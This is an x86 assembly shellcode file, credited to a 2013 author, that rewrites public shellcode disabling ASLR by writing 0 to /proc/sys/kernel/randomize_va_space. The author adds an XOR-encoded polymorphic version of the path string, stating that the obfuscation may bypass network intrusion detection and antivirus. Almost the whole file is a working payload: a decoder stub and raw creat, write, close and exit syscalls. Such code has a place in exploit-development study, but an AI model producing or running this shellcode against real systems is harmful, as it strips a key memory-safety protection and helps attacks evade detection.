;  poly1.nasm( polymorphic rewrite of disableASLRx86.nasm)
;  downloaded from http://shell-storm.org/files/shellcode-813.php
;  written by Jean Pascal Pereira
;
;  Modified to correct segfault I was getting then created a polymorphic version
;  that obfuscates portions of the code which may bypass NIDS/AV.  Original code
;  remains and is commented out to allow comparison.
;
;  May 4, 2013
;
; This program was re-written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
;
; John W. Pierce, CISSP, remsanattexascarverdotcom
global	_start

section .text

_start:

;
;	open, creat - open and possibly create a file or device
;	int creat(const char *pathname, mode_t mode);
;	open or create /proc/sys/kernel/randomize_va_space
;
xor	eax, eax
push	eax		; terminate the string
;push	0x65636170
;push	0x735f6176
;push	0x5f657a69
;push	0x6d6f646e
;push	0x61722f6c
;push	0x656e7265
;push	0x6b2f7379
;push	0x732f636f
;push	0x72702f2f	; /proc/sys/kernel/randomize_va_space
; polymorphism: - used reverseXOR.py to reverse /proc/sys/kernel/randomize_va_space
; and xor it with 0x10 1 character at a time
; moved it to end of code and am decoding/pushing it here
;
; jmp/call/pop to get address of string
;
jmp	short call_decoder
decoder:
pop	edi
push	byte 0x9	; length of string, make sure it's an divisible by 4
pop	ecx		; counter for loop
loop:
mov	ebx, [edi]
xor	ebx, 0x10101010
push	ebx
add	edi, 4
dec	ecx
jnz	loop
mov	ebx, esp	; point to filename
mov	cx, 0x2bc	; mode = 700, rwx------
mov	al, 0x8		; creat
int	0x80		; file descriptor returned in eax

;
;       write - write to a file descriptor
;       ssize_t write(int fd, const void *buf, size_t count);
;	write 0 to /proc/sys/kernel/randomize_va_space
;
mov	ebx, eax	; fd
;push	eax		; superfluous so removed from code
mov	dx, 0x3a30	; 0:, colon is throwaway (see count below)
push	dx
mov	ecx, esp	; *buf points to 0: fd
xor	edx, edx	
inc	edx		; count = 1
mov	al, 0x4		; write
int	0x80		

;
;       close - close a file descriptor
;       int close(int fd);
;
mov	al, 0x6		; fd still in ebx
int	0x80
; returns 0 on success

;
;	exit
;
inc	eax
int	0x80

call_decoder:
call	decoder
encoded	db	0x60,0x71,0x73,0x75,0x66,0x71,0x4f,0x63,0x79,0x6a,0x75,0x4f,0x7e,0x74,0x7f,0x7d,0x7c,0x3f,0x62,0x71,0x75,0x62,0x7e,0x75,0x69,0x63,0x3f,0x7b,0x7f,0x73,0x3f,0x63,0x3f,0x3f,0x60,0x62	
